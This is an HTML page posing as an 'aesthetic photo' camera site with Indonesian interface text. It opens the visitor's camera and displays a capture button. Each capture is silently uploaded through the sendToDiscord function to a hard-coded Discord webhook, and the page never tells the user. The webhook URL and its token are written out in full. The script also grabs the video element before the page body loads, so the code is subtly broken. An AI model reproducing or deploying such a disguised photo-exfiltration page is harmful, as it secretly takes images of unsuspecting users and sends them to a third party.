<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Foto Aesthetic by Risqi123</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <!-- Menambahkan Font Awesome -->
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: linear-gradient(to bottom, #141e30, #243b55);
            color: white;
            font-family: Arial, sans-serif;
        }

        #video {
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            margin-bottom: 20px;
            max-width: 90%;
        }

        .button-group {
            display: flex;
            justify-content: center;
            gap: 15px;
        }

        button {
            padding: 15px;
            font-size: 24px;
            border: none;
            border-radius: 50%;
            background: #4CAF50;
            color: white;
            cursor: pointer;
            transition: background 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 60px;
            height: 60px;
        }

        button:hover {
            background: #45a049;
        }

        button:active {
            background: #3e8e41;
        }
    </style>
    <script>
        let currentFacingMode = 'user';
        const video = document.getElementById('video');

        // Function to start camera with specific facing mode
        function startCamera(facingMode) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode } })
                .then(stream => {
                    video.srcObject = stream;
                })
                .catch(error => {
                    console.error('Error accessing camera:', error);
                    // Menambahkan tampilan kesalahan yang lebih rinci
                    if (error.name === 'NotAllowedError') {
                        alert('Izin kamera belum diberikan. Harap izinkan akses kamera di pengaturan browser.');
                    } else if (error.name === 'NotFoundError') {
                        alert('Kamera tidak ditemukan. Pastikan perangkat memiliki kamera.');
                    } else {
                        alert('Kamera tidak bisa diakses. Error: ' + error.message);
                    }
                });
        }

        // Toggle camera between front and back
        function toggleCamera() {
            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
            startCamera(currentFacingMode);
        }

        // Function to send photo to Discord webhook
        async function sendToDiscord(blob) {
            const webhookUrl = "https://discordapp.com/api/webhooks/1320606404985487391/mvaetfPZAjSEaEI9823-e7pqoXoe04V5NCcb8uQZyso983SnYWEbckHmOVUaPw6o2kFJ";
            const formData = new FormData();
            formData.append('file', blob, 'photo.png');

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            const canvas = document.getElementById('canvas');
            const captureButton = document.getElementById('capture');

            // Menambahkan pengecekan untuk memastikan bahwa kamera sudah bisa diakses
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                startCamera(currentFacingMode);
            } else {
                alert('Fitur kamera tidak didukung oleh browser ini.');
            }

            captureButton.addEventListener('click', () => {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Draw video frame to canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert canvas to blob and send to Discord
                canvas.toBlob(blob => {
                    sendToDiscord(blob);
                });
            });
        });
    </script>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <div class="button-group">
        <!-- Tombol Foto dengan Ikon Kamera -->
        <button id="capture">
            <i class="fas fa-camera"></i>
        </button>
        <!-- Tombol Toggle Kamera dengan Ikon Sinkronisasi -->
        <button onclick="toggleCamera()">
            <i class="fas fa-sync-alt"></i>
        </button>
    </div>
</body>
</html>
